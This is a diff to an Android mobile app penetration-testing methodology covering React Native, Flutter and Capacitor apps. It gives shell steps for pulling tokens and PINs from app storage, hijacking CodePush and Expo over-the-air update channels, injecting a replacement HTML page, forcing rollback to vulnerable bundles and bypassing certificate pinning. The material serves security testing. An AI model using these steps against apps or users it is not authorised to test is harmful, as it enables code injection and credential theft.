+  grep -rn "ReactNativeWebView\|unity-webview\|UNITYWEBVIEW_ANDROID_ENABLE_CAMERA\|UNITYWEBVIEW_ANDROID_ENABLE_MICROPHONE" "$DEC/hermes/"
   ```
   ```javascript
   // inside the WebView (chrome://inspect, or a page you got loaded):
@@ -1036,7 +1095,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:**
   ```bash
   grep -a -n 'react-native-ssl-pinning\|RNSslPinningPackage\|com\.toyberman\|RNGoogleSafetyNetPackage' hbc.strings
-  grep -rn 'RNSslPinningPackage\|com.toyberman\|CertificatePinner\|networkSecurityConfig' out/sources out/AndroidManifest.xml
+  grep -rn 'RNSslPinningPackage\|com.toyberman\|CertificatePinner\|networkSecurityConfig' $DEC/jadx/sources $DEC/apktool/AndroidManifest.xml
   ```
   Then replace the pinning call with a no-op and repack per D19-021, or simply use the XHR interceptor in
   D19-020 which bypasses TLS entirely.
@@ -1064,21 +1123,24 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:**
   ```bash
   # React Native AsyncStorage (SQLite):
-  adb exec-out run-as <pkg> cat databases/RKStorage > RKStorage.db
+  adb -s "$SERIAL" exec-out run-as <pkg> cat databases/RKStorage > RKStorage.db
   sqlite3 RKStorage.db 'select key, substr(value,1,400) from catalystLocalStorage;'
-  adb shell "run-as <pkg> ls -la files/mmkv/"                              # react-native-mmkv
+  adb -s "$SERIAL" shell "run-as <pkg> ls -la files/mmkv/"                              # react-native-mmkv
   # Capacitor / Cordova:
-  adb shell "run-as <pkg> cat shared_prefs/CapacitorStorage.xml"
-  adb shell "run-as <pkg> ls -laR app_webview/Default/'Local Storage'/leveldb app_webview/Default/IndexedDB"
-  adb exec-out run-as <pkg> tar c app_webview/Default 2>/dev/null > webview.tar && tar xf webview.tar
-  # Flutter:
-  adb shell "run-as <pkg> cat shared_prefs/FlutterSharedPreferences.xml"
-  adb shell "run-as <pkg> cat shared_prefs/FlutterSecureStorage.xml"
-  # Unity / Xamarin:
-  adb shell "run-as <pkg> cat shared_prefs/<pkg>.v2.playerprefs.xml"
-  adb shell "run-as <pkg> ls -la shared_prefs/"
+  adb -s "$SERIAL" shell "run-as <pkg> cat shared_prefs/CapacitorStorage.xml"
+  adb -s "$SERIAL" shell "run-as <pkg> ls -laR app_webview/Default/'Local Storage'/leveldb app_webview/Default/IndexedDB"
+  adb -s "$SERIAL" exec-out run-as <pkg> tar c app_webview/Default 2>/dev/null > webview.tar && tar xf webview.tar
+  # Flutter: legacy XML and the DataStore backend (shared_preferences >= 2.3 async / with-cache API)
+  adb -s "$SERIAL" shell 'run-as <pkg> cat shared_prefs/FlutterSharedPreferences.xml'
+  adb -s "$SERIAL" exec-out run-as <pkg> cat files/datastore/FlutterSharedPreferences.preferences_pb | strings -n 4
+  adb -s "$SERIAL" shell 'run-as <pkg> cat shared_prefs/FlutterSecureStorage.xml'   # values are AES-wrapped by a Keystore key (or EncryptedSharedPreferences): ciphertext here is expected — hook FlutterSecureStoragePlugin.read / the Dart read() for plaintext, never report the XML
+  # Unity:
+  adb -s "$SERIAL" shell 'run-as <pkg> cat shared_prefs/<pkg>.v2.playerprefs.xml'
+  # Xamarin.Essentials / .NET MAUI Essentials (Preferences = plaintext; SecureStorage values are Keystore-wrapped):
+  adb -s "$SERIAL" shell 'run-as <pkg> cat shared_prefs/<pkg>.xamarinessentials.xml shared_prefs/<pkg>.microsoft.maui.essentials.preferences.xml 2>/dev/null'
+  adb -s "$SERIAL" shell 'run-as <pkg> ls -la shared_prefs/ files/ files/datastore/ 2>/dev/null'
   # cross-reference against the key names you already have:
-  grep -aiE 'token|jwt|refresh|session|pin|password|card|otp|entitle|premium' hbc.strings out_dir/pp.txt | sort -u
+  grep -aiE 'token|jwt|refresh|session|pin|password|card|otp|entitle|premium' hbc.strings $DEC/blutter/pp.txt | sort -u
   ```
 - **Proof:** A JWT, refresh token, PAN or PIN readable in plaintext from the pulled file, **plus** a replay of
   that token against the API returning the victim's data. The replay is the finding.
@@ -1098,29 +1160,34 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Attacker** | AM-09 |
 | **Applies to** | React Native with CodePush or expo-updates; Cordova/Ionic/Capacitor with a live-update plugin |
 | **Requires** | react-native, cordova, capacitor, flutter |
-| **Maps to** | CodePush `docs/setup-android.md` (`strings.xml` `CodePushDeploymentKey`; `MainApplication.getJSBundleFile()` override); `CodePush.java` (`getCustomPropertyFromStringsIfExist("PublicKey")` / `("ServerUrl")`, default `mServerUrl = "https://codepush.appcenter.ms/"`); expo `UpdatesConfiguration.kt`; MASWE-0049 (CWE-494), MASWE-0048; ATT&CK T1407 |
+| **Maps to** | CodePush `docs/setup-android.md` (`strings.xml` `CodePushDeploymentKey`; `MainApplication.getJSBundleFile()` override); `CodePush.java` (`getCustomPropertyFromStringsIfExist("PublicKey")` / `("ServerUrl")`, default `mServerUrl = "https://codepush.appcenter.ms/"` — retired 2025-03-31; a standalone server URL is expected); expo `UpdatesConfiguration.kt`; MASWE-0049 (CWE-494), MASWE-0048; ATT&CK T1407 |
 
 - **Test:** OTA JS/web delivery converts the app into a remote-code-execution surface whose trust anchor is a
   server and, optionally, a signature. First establish that the channel exists and where it points. Note the
   Android 14 read-only mandate (`setReadOnly()`) applies to **DEX, JAR and APK** files — it does **not** cover
-  JavaScript or Dart bundles, and teams routinely misread it as having secured their OTA.
+  JavaScript or Dart bundles, and teams routinely misread it as having secured their OTA. App Center and its
+  hosted CodePush were retired on 31 March 2025; CodePush survives as a self-hosted standalone server, so a vendor
+  host in `CodePushServerUrl` is now the expected shape — check who owns it. An app still configured for the retired
+  host has a channel whose host the vendor no longer controls: resolve it (`dig +short codepush.appcenter.ms`) and
+  treat a lapsed, unresolving or third-party-resolving host as a code-channel takeover candidate (-> D18 dangling-host
+  rules), not as a safe default.
 - **How:**
   ```bash
   # CodePush
-  grep -nE 'CodePushDeploymentKey|CodePushServerUrl|CodePushPublicKey' out/res/values/strings.xml
-  grep -rn 'com\.microsoft\.codepush\.react\.CodePush' out/sources | head
+  grep -nE 'CodePushDeploymentKey|CodePushServerUrl|CodePushPublicKey' $DEC/apktool/res/values/strings.xml
+  grep -rn 'com\.microsoft\.codepush\.react\.CodePush' $DEC/jadx/sources | head
   grep -a -n 'codepush\|deploymentKey' hbc.strings | head
   # expo-updates
-  grep -nE 'expo\.modules\.updates\.' out/AndroidManifest.xml
+  grep -nE 'expo\.modules\.updates\.' $DEC/apktool/AndroidManifest.xml
   # Cordova / Capacitor live update
   grep -rniE 'hot.?code.?push|live.?update|deploy|appflow|ionic-deploy|updateUrl|channel' \
-    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
-  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' out/sources | head
+    $DEC/apktool/res/xml/config.xml $DEC/apktool/assets/capacitor.config.json $DEC/apktool/assets/www/cordova_plugins.js 2>/dev/null
+  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' $DEC/jadx/sources | head
   # any custom loader
-  grep -rn 'DexClassLoader\|PathClassLoader\|InMemoryDexClassLoader\|loadScriptFromFile' out/sources | head
+  grep -rn 'DexClassLoader\|PathClassLoader\|InMemoryDexClassLoader\|loadScriptFromFile' $DEC/jadx/sources | head
   # on-device evidence of a channel that has already run
-  adb shell "run-as <pkg> ls -laR files/ | head -80"
-  adb shell "run-as <pkg> ls -laR files/ | grep -iE 'ionic|dist|snapshot|www|CodePush|expo'"
+  adb -s "$SERIAL" shell "run-as <pkg> ls -laR files/ | head -80"
+  adb -s "$SERIAL" shell "run-as <pkg> ls -laR files/ | grep -iE 'ionic|dist|snapshot|www|CodePush|expo'"
   ```
 - **Proof:** A deployment key plus server URL in `strings.xml`, or `expo.modules.updates.EXPO_UPDATE_URL` in
   the merged manifest, together with a `getJSBundleFile()` override returning `CodePush.getJSBundleFile()`.
@@ -1128,7 +1195,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   override), D19-029 (rollback). This item also changes what "the app" means in your report's scope section
   (-> D19-003).
 - **Ruled out when:** No CodePush strings, no `expo.modules.updates.*` meta-data, no live-update plugin in
-  `cordova_plugins.js` / `capacitor.plugins.json`, no `loadScriptFromFile` override, and a `find` over the
+  `cordova_plugins.js` / `capacitor.plugins.json` (including `CapacitorUpdater`, D19-030), no
+  `flutter_assets/shorebird.yaml` (D19-081), no `loadScriptFromFile` override, and a `find` over the
   app's data directory after a full walkthrough returns no downloaded bundle or web payload. Then the APK's
   code is the only code and the OTA items below are not applicable.
 
@@ -1143,18 +1211,18 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | react-native, device |
 | **Maps to** | expo `UpdatesConfiguration.kt` meta-data keys `CODE_SIGNING_CERTIFICATE`, `CODE_SIGNING_METADATA`, `CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN`, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`, and `UpdatesController.overrideConfiguration()`; MASWE-0049 (CWE-494); ATT&CK T1407 |
 
-- **Test:** expo-updates verifies an update only when a code-signing certificate is configured. If
+- **Test:** (Owner of the expo-updates signing test; D17-026 points here.) expo-updates verifies an update only when a code-signing certificate is configured. If
   `CODE_SIGNING_CERTIFICATE` is absent, or `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` is `true`, the only thing
   protecting the app's code is TLS to the update host — and Expo's own documentation is explicit that without
   code signing, "ISPs, CDNs, cloud providers, and even EAS itself" are in the trust path.
 - **How:**
   ```bash
-  grep -nE 'expo\.modules\.updates\.(CODE_SIGNING_CERTIFICATE|CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|CODE_SIGNING_METADATA|CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN)' out/AndroidManifest.xml
-  grep -nE 'expo\.modules\.updates\.(EXPO_UPDATE_URL|EXPO_RUNTIME_VERSION|EXPO_UPDATES_CHECK_ON_LAUNCH|ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE|DISABLE_ANTI_BRICKING_MEASURES)' out/AndroidManifest.xml
+  grep -nE 'expo\.modules\.updates\.(CODE_SIGNING_CERTIFICATE|CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|CODE_SIGNING_METADATA|CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN)' $DEC/apktool/AndroidManifest.xml
+  grep -nE 'expo\.modules\.updates\.(EXPO_UPDATE_URL|EXPO_RUNTIME_VERSION|EXPO_UPDATES_CHECK_ON_LAUNCH|ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE|DISABLE_ANTI_BRICKING_MEASURES)' $DEC/apktool/AndroidManifest.xml
   # demonstrate: implement the Expo Updates protocol on a host you control and point the device at it
   mitmproxy --set block_global=false -s redirect_expo.py       # rewrite the manifest request to your host
-  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
-  adb shell "run-as <pkg> ls -laR files/.expo-internal/"
+  adb -s "$SERIAL" shell am force-stop <pkg> && adb -s "$SERIAL" shell monkey -p <pkg> 1
+  adb -s "$SERIAL" shell "run-as <pkg> ls -laR files/.expo-internal/"
   ```
   Relevant `app.json` keys on the build side: `updates.url`, `updates.enabled`, `updates.checkAutomatically`
   (`ON_LOAD` / `ON_ERROR_RECOVERY` / `NEVER` / `WIFI_ONLY`), `updates.fallbackToCacheTimeout`,
@@ -1180,21 +1248,21 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Attacker** | AM-09; AM-06 where TLS is the only control; AM-01 for anyone who obtains the deployment key |
 | **Applies to** | React Native + `react-native-code-push` |
 | **Requires** | react-native, device |
-| **Maps to** | `CodePush.java` (`private static String mPublicKey;`, `getCustomPropertyFromStringsIfExist("PublicKey")`, `getPublicKeyByResourceDescriptor(...)` throwing `CodePushInvalidPublicKeyException("Specified public key is empty")`, default `mServerUrl = "https://codepush.appcenter.ms/"`); `CodePushConstants.java` (`BUNDLE_JWT_FILE = ".codepushrelease"`, `STATUS_FILE = "codepush.json"`); CodePush README (`CheckFrequency.ON_APP_START` default); MASWE-0049 |
+| **Maps to** | `CodePush.java` (`private static String mPublicKey;`, `getCustomPropertyFromStringsIfExist("PublicKey")`, `getPublicKeyByResourceDescriptor(...)` throwing `CodePushInvalidPublicKeyException("Specified public key is empty")`, default `mServerUrl = "https://codepush.appcenter.ms/"` — retired 2025-03-31; a standalone server URL is expected); `CodePushConstants.java` (`BUNDLE_JWT_FILE = ".codepushrelease"`, `STATUS_FILE = "codepush.json"`); CodePush README (`CheckFrequency.ON_APP_START` default); MASWE-0049 |
 
-- **Test:** CodePush verifies the downloaded bundle only when a public key is configured — `mPublicKey` is
+- **Test:** (Owner of the CodePush signing test; D17-027 points here; the deployment-key observation lives only in this chapter's Graveyard.) CodePush verifies the downloaded bundle only when a public key is configured — `mPublicKey` is
   checked against the `.codepushrelease` JWT inside the package. With no public key the runtime accepts
   whatever the server sends, or whatever anyone who can impersonate the server or obtain the deployment key
   sends.
 - **How:**
   ```bash
-  grep -n 'CodePushPublicKey' out/res/values/strings.xml || echo "NO PUBLIC KEY -> unsigned OTA"
-  grep -n 'CodePushServerUrl'  out/res/values/strings.xml    # non-default server?
-  grep -n 'CodePushDeploymentKey' out/res/values/strings.xml # the key itself ships inside the APK
+  grep -n 'CodePushPublicKey' $DEC/apktool/res/values/strings.xml || echo "NO PUBLIC KEY -> unsigned OTA"
+  grep -n 'CodePushServerUrl'  $DEC/apktool/res/values/strings.xml    # self-hosted host: record owner + TLS; absent => the retired appcenter.ms default (D19-025)
+  grep -n 'CodePushDeploymentKey' $DEC/apktool/res/values/strings.xml # the key itself ships inside the APK
   # after an OTA has landed, confirm what is live and whether it was signed:
-  adb shell "run-as <pkg> cat files/CodePush/codepush.json"
-  adb shell "run-as <pkg> find files/CodePush -name '.codepushrelease'"     # present => signed release
-  adb shell "run-as <pkg> find files/CodePush -name 'index.android.bundle' -exec ls -l {} \;"
+  adb -s "$SERIAL" shell "run-as <pkg> cat files/CodePush/codepush.json"
+  adb -s "$SERIAL" shell "run-as <pkg> find files/CodePush -name '.codepushrelease'"     # present => signed release
+  adb -s "$SERIAL" shell "run-as <pkg> find files/CodePush -name 'index.android.bundle' -exec ls -l {} \;"
   ```
 - **Proof:** No `CodePushPublicKey` string resource, no `.codepushrelease` JWT beside the downloaded bundle,
   and an intercepted or redirected update response resulting in your JS executing after `restartApp` — with
@@ -1225,11 +1293,11 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:**
   ```bash
   grep -a -nE 'setDeploymentKey|deploymentKey|serverUrl|overrideConfiguration|updateUrl|runtimeVersion' hbc.strings
-  hermes-decomp xref ext/assets/index.android.bundle --query 'deploymentKey'
-  hermes-decomp xref ext/assets/index.android.bundle --query 'overrideConfiguration'
-  grep -rn 'UpdatesController.overrideConfiguration' out/sources | head
+  hermes-decomp xref $DEC/raw/assets/index.android.bundle --query 'deploymentKey'
+  hermes-decomp xref $DEC/raw/assets/index.android.bundle --query 'overrideConfiguration'
+  grep -rn 'UpdatesController.overrideConfiguration' $DEC/jadx/sources | head
   # then trace the argument backwards to its source and drive it:
-  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<route>?deploymentKey=<yours>" <pkg>
+  adb -s "$SERIAL" shell 'am start -a android.intent.action.VIEW -d "<scheme>://<route>?deploymentKey=<yours>" <pkg>'   # single-quoted: the device sh would otherwise re-parse the ?
   ```
 - **Proof:** A JS code path that sets the deployment key or update URL from a value tracing back to a deep-link
   parameter, a push `data` field or a WebView message — demonstrated end to end, with your update server
@@ -1243,24 +1311,24 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.privilege_escalation` (null — rated on the control the old bundle lacks); or the specific vulnerability class the rollback target reintroduces |
+| **VRT** | `broken_access_control.privilege_escalation` (varies — rated on the control the old bundle lacks); or the specific vulnerability class the rollback target reintroduces |
 | **Attacker** | AM-03 zero-permission local app (corrupting the current bundle requires only the app's own writable cache in the `run-as`/rooted case); AM-09 for the served-downgrade variant |
 | **Applies to** | React Native with CodePush or expo-updates |
 | **Requires** | react-native, device |
 | **Maps to** | `CodePushConstants.java` (`PREVIOUS_PACKAGE_KEY`, `CURRENT_PACKAGE_KEY`, `FAILED_UPDATES_KEY`, `LATEST_ROLLBACK_INFO_KEY`, `LATEST_ROLLBACK_PACKAGE_HASH_KEY`, `LATEST_ROLLBACK_COUNT_KEY`); CodePush README (automatic rollback keeps a copy of the previous update); expo `UpdatesConfiguration.kt` (`DISABLE_ANTI_BRICKING_MEASURES`) |
 
-- **Test:** CodePush keeps the previous package and rolls back on failure; expo-updates has anti-bricking
+- **Test:** (D11-029 owns the cache as a storage write target; this item owns the OTA mechanism — cross-reference, do not re-state.) CodePush keeps the previous package and rolls back on failure; expo-updates has anti-bricking
   measures that can be switched off. Check whether a device can be pinned to a known-vulnerable bundle the
   vendor believes is retired.
 - **How:**
   ```bash
-  adb shell "run-as <pkg> cat files/CodePush/codepush.json"       # currentPackage / previousPackage
-  adb shell "run-as <pkg> cat shared_prefs/CodePush.xml"          # CODE_PUSH_FAILED_UPDATES, LATEST_ROLLBACK_INFO
-  grep -n 'DISABLE_ANTI_BRICKING_MEASURES' out/AndroidManifest.xml
+  adb -s "$SERIAL" shell "run-as <pkg> cat files/CodePush/codepush.json"       # currentPackage / previousPackage
+  adb -s "$SERIAL" shell "run-as <pkg> cat shared_prefs/CodePush.xml"          # CODE_PUSH_FAILED_UPDATES, LATEST_ROLLBACK_INFO
+  grep -n 'DISABLE_ANTI_BRICKING_MEASURES' $DEC/apktool/AndroidManifest.xml
   # force a rollback: corrupt the current bundle so the update is marked failed, then relaunch
-  adb shell "run-as <pkg> sh -c 'printf x >> files/CodePush/<hash>/<app>/index.android.bundle'"
-  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
-  adb shell "run-as <pkg> cat files/CodePush/codepush.json"       # now shows the previous package as current
+  adb -s "$SERIAL" shell "run-as <pkg> sh -c 'printf x >> files/CodePush/<hash>/<app>/index.android.bundle'"
+  adb -s "$SERIAL" shell am force-stop <pkg> && adb -s "$SERIAL" shell monkey -p <pkg> 1
+  adb -s "$SERIAL" shell "run-as <pkg> cat files/CodePush/codepush.json"       # now shows the previous package as current
   ```
 - **Proof:** The app reverting to `previousPackage` (visible in `codepush.json`) and the old, vulnerable
   behaviour returning — demonstrate the reintroduced defect, not merely the version change.
@@ -1286,13 +1354,13 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   every D10 primitive granted to the update server.
 - **How:**
   ```bash
-  grep -rniE 'hot.?code.?push|live.?update|appflow|ionic-deploy|updateUrl|channel' \
-    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
-  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' out/sources | head
-  adb shell "run-as <pkg> ls -laR files/ | grep -iE 'ionic|dist|snapshot|www'"
+  # channel discovery: D19-025 (reuse logs/D19-025.txt); the Capacitor-specific updater config:
+  grep -nE 'CapacitorUpdater|capgo' $DEC/apktool/assets/capacitor.plugins.json
+  python3 -c "import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('plugins',{}).get('CapacitorUpdater'))"   # updateUrl / autoUpdate / signing-encryption keys — absent keys => unsigned payload
+  adb -s "$SERIAL" shell "run-as <pkg> ls -laR files/ | grep -iE 'ionic|dist|snapshot|www|versions'"
   # substitute and restart
-  adb shell "run-as <pkg> sh -c 'cat > files/<served-dir>/index.html'" < evil.html
-  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
+  adb -s "$SERIAL" shell "run-as <pkg> sh -c 'cat > files/<served-dir>/index.html'" < evil.html
+  adb -s "$SERIAL" shell am force-stop <pkg> && adb -s "$SERIAL" shell monkey -p <pkg> 1
   ```
 - **Proof:** A downloaded web payload directory on device that the WebView serves from, plus your
   `index.html` rendering in the app after restart, with the bridge object (`androidBridge` / `_cordovaNative`)
@@ -1321,12 +1389,12 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:**
   ```bash
   # before
-  adb shell "run-as <pkg> find files -name 'index.android.bundle' -exec md5sum {} \;" > before.txt
-  adb shell dumpsys package <pkg> | grep -E 'versionCode|lastUpdateTime|firstInstallTime' >> before.txt
+  adb -s "$SERIAL" shell "run-as <pkg> find files -name 'index.android.bundle' -exec md5sum {} \;" > before.txt
+  adb -s "$SERIAL" shell dumpsys package <pkg> | grep -E 'versionCode|lastUpdateTime|firstInstallTime' >> before.txt
   apksigner verify --print-certs base.apk >> before.txt
   # ... deliver the attacker bundle, restart ...
-  adb shell "run-as <pkg> find files -name 'index.android.bundle' -exec md5sum {} \;" > after.txt
-  adb shell dumpsys package <pkg> | grep -E 'versionCode|lastUpdateTime|firstInstallTime' >> after.txt
+  adb -s "$SERIAL" shell "run-as <pkg> find files -name 'index.android.bundle' -exec md5sum {} \;" > after.txt
+  adb -s "$SERIAL" shell dumpsys package <pkg> | grep -E 'versionCode|lastUpdateTime|firstInstallTime' >> after.txt
   diff before.txt after.txt
   ```
 - **Proof:** A changed bundle hash with **unchanged `versionCode`, `lastUpdateTime` and signing certificate**,
@@ -1345,7 +1413,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null) when it also enables the Dart VM service; otherwise Informational/Low |
+| **VRT** | `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (varies) when it also enables the Dart VM service; otherwise Informational/Low |
 | **Attacker** | AM-01 for the artefact; AM-03/AM-06 if the VM service is reachable |
 | **Applies to** | Flutter Android |
 | **Requires** | flutter |
@@ -1356,13 +1424,13 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   those in a production APK is itself the observation; the finding is what they enable.
 - **How:**
   ```bash
-  unzip -l target.apk | grep -E 'flutter_assets/(kernel_blob\.bin|isolate_snapshot_data|vm_snapshot_data)'
-  unzip -l target.apk | grep -E 'lib/[^/]+/libapp\.so'
-  strings ext/lib/arm64-v8a/libapp.so | grep -m1 -E '^[0-9a-f]{32}$'     # Dart snapshot hash
+  grep -E 'flutter_assets/(kernel_blob\.bin|isolate_snapshot_data|vm_snapshot_data)' "$E/logs/D19-001-apklist.txt"
+  grep -E 'lib/[^/]+/libapp\.so' "$E/logs/D19-001-apklist.txt"
+  strings $DEC/raw/lib/arm64-v8a/libapp.so | grep -m1 -E '^[0-9a-f]{32}$'     # Dart snapshot hash
   # is the VM service listening?
-  adb logcat | grep -iE 'Observatory|VM service|Dart VM service listening'
-  adb shell "cat /proc/net/tcp /proc/net/tcp6" | grep -i ' 0A '          # any LISTEN socket
-  curl -s http://127.0.0.1:<port>/ | head                                 # from an adb shell
+  adb -s "$SERIAL" logcat | grep -iE 'Observatory|VM service|Dart VM service listening'
+  adb -s "$SERIAL" shell "cat /proc/net/tcp /proc/net/tcp6" | grep -i ' 0A '          # any LISTEN socket
+  curl -s http://127.0.0.1:<port>/ | head                                 # from an adb -s "$SERIAL" shell
   ```
 - **Proof:** `kernel_blob.bin` present in a build you verified is the store artefact
   (`apksigner verify --print-certs`), and — for the escalation — the Dart VM service URL from logcat opening
@@ -1389,7 +1457,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   readable. This is the step whose absence makes an entire Flutter app look clean.
 - **How:**
   ```bash
-  unzip -o split_config.arm64_v8a.apk 'lib/arm64-v8a/libapp.so' 'lib/arm64-v8a/libflutter.so' -d native
+  unzip -o "$E"/apk/split_config.arm64_v8a.apk 'lib/arm64-v8a/libapp.so' 'lib/arm64-v8a/libflutter.so' -d native
   # some builds name it lib*flutter_artifacts.so instead:
   APP=$(ls native/lib/arm64-v8a/libapp.so native/lib/arm64-v8a/lib*flutter_artifacts.so 2>/dev/null | head -1)
   strings -n 6 "$APP" > app_strings.txt
@@ -1399,8 +1467,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   grep -E '^/[a-z0-9_/-]{3,}$' app_strings.txt | sort -u | head -40      # candidate Dart routes
   grep -aiE 'api[_-]?key|token|secret|BEGIN (RSA|EC|PRIVATE)|supabase|stripe|aws' app_strings.txt
   # and the asset side, which is plain files:
-  unzip -o target.apk 'assets/flutter_assets/*' -d fl && ls fl/assets/flutter_assets | head
-  unzip -p target.apk 'assets/flutter_assets/NOTICES*' 2>/dev/null | strings | grep -iE '^[a-z0-9_]+ [0-9]+\.[0-9]+' | head -60
+  unzip -o "$E"/apk/base.apk 'assets/flutter_assets/*' -d fl && ls fl/assets/flutter_assets | head
+  unzip -p "$E"/apk/base.apk 'assets/flutter_assets/NOTICES*' 2>/dev/null | strings | grep -iE '^[a-z0-9_]+ [0-9]+\.[0-9]+' | head -60
   ```
 - **Proof:** Recovered route regexes, MethodChannel and JS-channel names, host allow-lists and backend
   hostnames that appear nowhere in the DEX. One engagement recovered a `__gci`/`JsChannel` bridge, an
@@ -1429,21 +1497,21 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   engine so the app dumps its own class/function/field table at runtime.
 - **How:**
   ```bash
-  unzip -o target.apk "lib/*" -d app_extracted
+  # lib/ of every split is already unpacked under $DEC/raw (see the conventions at the top of ## Items)
   # Blutter first — it needs cmake, ninja and capstone, and the Dart version string from libflutter.so .rodata
-  strings app_extracted/lib/arm64-v8a/libflutter.so | grep -m1 -E 'Dart VM version|^[0-9]+\.[0-9]+\.[0-9]+ '
-  python3 blutter.py app_extracted/lib/arm64-v8a out_dir
-  ls out_dir/      # asm/*  pp.txt  objs.txt  blutter_frida.js
-  grep -rn 'ensureInitialized\|::init\b' out_dir/asm/ | head
-  grep -rniE 'isPremium|entitlement|verify|validate|checkRoot|isJailbroken|licen[cs]e' out_dir/asm/ | head -40
-  frida -D "$SERIAL" -f <pkg> -l out_dir/blutter_frida.js
+  strings $DEC/raw/lib/arm64-v8a/libflutter.so | grep -m1 -E 'Dart VM version|^[0-9]+\.[0-9]+\.[0-9]+ '
+  python3 blutter.py "$DEC/raw/lib/arm64-v8a" "$DEC/blutter"
+  ls $DEC/blutter/      # asm/*  pp.txt  objs.txt  blutter_frida.js
+  grep -rn 'ensureInitialized\|::init\b' $DEC/blutter/asm/ | head
+  grep -rniE 'isPremium|entitlement|verify|validate|checkRoot|isJailbroken|licen[cs]e' $DEC/blutter/asm/ | head -40
+  frida -D "$SERIAL" -f <pkg> -l $DEC/blutter/blutter_frida.js -q -t 120
 
   # Fallback — reFlutter, when Blutter will not build for this Dart version
-  pip3 install reflutter && reflutter target.apk
-  java -jar uber-apk-signer.jar --apks <patched>.apk && adb install -r <signed>.apk
-  adb -d shell "cat /data/data/<pkg>/dump.dart" > dump.dart
+  pip3 install reflutter && reflutter "$E"/apk/base.apk
+  java -jar uber-apk-signer.jar --apks <patched>.apk && adb -s "$SERIAL" install -r <signed>.apk
+  adb -s "$SERIAL" exec-out run-as <pkg> cat dump.dart > dump.dart        # or su -c on the rooted AVD when the repack is not debuggable; never adb -s "$SERIAL" -d (USB-only, fails on an emulator)
   grep -nE 'class |Function|0x' dump.dart | head -60
-  nm -D app_extracted/lib/arm64-v8a/libapp.so | grep -i IsolateSnapshotInstructions
+  nm -D $DEC/raw/lib/arm64-v8a/libapp.so | grep -i IsolateSnapshotInstructions
   # add the _kDartIsolateSnapshotInstructions offset to dumped offsets to get real VM addresses
   ```
 - **Proof:** Either symbolised output — a reconstructed `main` showing named call edges such as
@@ -1478,14 +1546,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   and C2 paths.
 - **How:**
   ```bash
-  python3 blutter.py ext/lib/arm64-v8a out_dir
-  grep -aiE 'https?://|/api/|/v[0-9]+/' out_dir/pp.txt | sort -u
-  grep -aiE 'secret|token|apikey|iv|salt|BEGIN (RSA )?PRIVATE KEY|AES|HMAC|nonce=' out_dir/pp.txt
-  grep -anE 'plugins\.flutter\.io|dev\.flutter|MethodChannel' out_dir/pp.txt | sort -u | head -40
-  less out_dir/objs.txt            # nested object dump: maps, lists, const class instances
-  gitleaks detect -s out_dir/pp.txt --no-git --verbose
+  python3 blutter.py "$DEC/raw/lib/arm64-v8a" "$DEC/blutter"
+  grep -aiE 'https?://|/api/|/v[0-9]+/' $DEC/blutter/pp.txt | sort -u
+  grep -aiE 'secret|token|apikey|iv|salt|BEGIN (RSA )?PRIVATE KEY|AES|HMAC|nonce=' $DEC/blutter/pp.txt
+  grep -anE 'plugins\.flutter\.io|dev\.flutter|MethodChannel' $DEC/blutter/pp.txt | sort -u | head -40
+  less $DEC/blutter/objs.txt            # nested object dump: maps, lists, const class instances
+  gitleaks dir $DEC/blutter/pp.txt --no-banner        # after the positive control in D19-012; 'detect -s --no-git' is the pre-8.19 syntax
   # some constants live in .rodata rather than the pool:
-  strings -n 8 ext/lib/arm64-v8a/libapp.so | grep -aiE 'https?://|BEGIN .*PRIVATE KEY|/api/'
+  strings -n 8 $DEC/raw/lib/arm64-v8a/libapp.so | grep -aiE 'https?://|BEGIN .*PRIVATE KEY|/api/'
   ```
